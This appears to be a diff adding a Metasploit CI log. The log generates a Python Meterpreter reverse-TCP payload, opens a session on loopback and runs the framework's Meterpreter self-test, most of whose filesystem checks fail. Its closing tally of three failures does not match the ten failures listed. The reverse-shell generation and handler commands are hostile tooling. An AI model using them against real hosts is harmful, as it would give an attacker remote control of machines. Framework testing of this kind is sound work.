@@ -1,0 +1,74 @@
+use python/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-249kdy.py -f raw MeterpreterTryToFork=false lport=6016 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-249kdy.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 15
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6016 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 16 opened (127.0.0.1:6016 -> 127.0.0.1:50084 ) at 2022-01-19 00:54:46 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=16 addentropy=true verbose=true
+
+[*] Setup: changing working directory to C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Running against session 16
+[*] Session type is meterpreter and platform is windows
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting process tests
+[*] Pid: 3556
+[+] should return its own process id
+[*] PID info: {"pid"=>3556, "ppid"=>1876, "name"=>"python.exe", "path"=>"C:\\msys64\\mingw64\\bin\\python.exe", "session"=>nil, "user"=>"fv-az159-2\\runneradmin", "arch"=>"x64"}
+[+] should return a list of processes
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[-] FAILED: should return the proper directory separator
+[*] CWD: C:/Users/RUNNER~1/AppData/Local/Temp
+[+] should return the current working directory
+[-] FAILED: should list files in the current directory
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Current directory: "C:/Users/RUNNER~1/AppData/Local/Temp"
+[-] FAILED: should stat a directory
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_stat: Operation failed: Unknown error
+[*] Directory Name: meterpreter-test-dir-sbpicwoj
+[-] FAILED: should create and remove a dir
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Directory Name: meterpreter-test-dir-sbpicwoj
+[-] FAILED: should change directories
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] File Name: meterpreter-test-sbpicwoj
+[*] Wrote to meterpreter-test-sbpicwoj, checking contents
+[*] Wrote test
+[-] FAILED: should create and remove files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Remote File Name: meterpreter-test-file-sbpicwoj.txt
+[*] uploading
+[*] done
+[*] remote file exists? false
+[-] FAILED: should upload a file
+[*] Source File Name: meterpreter-test-sbpicwoj
+[*] Destination File Name: meterpreter-test-sbpicwoj-moved
+[-] FAILED: should move files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Source File Name: meterpreter-test-sbpicwoj
+[*] Destination File Name: meterpreter-test-sbpicwoj-copied
+[-] FAILED: should copy files
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_ls: Operation failed: Unknown error
+[*] Remote File Name: meterpreter-test-file-sbpicwoj.txt
+[*] uploading
+[*] done
+[*] remote file exists? false
+[-] FAILED: should do md5 and sha1 of files
+[*] Testing complete in 1.032096
+[-] Passed: 17; Failed: 3
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
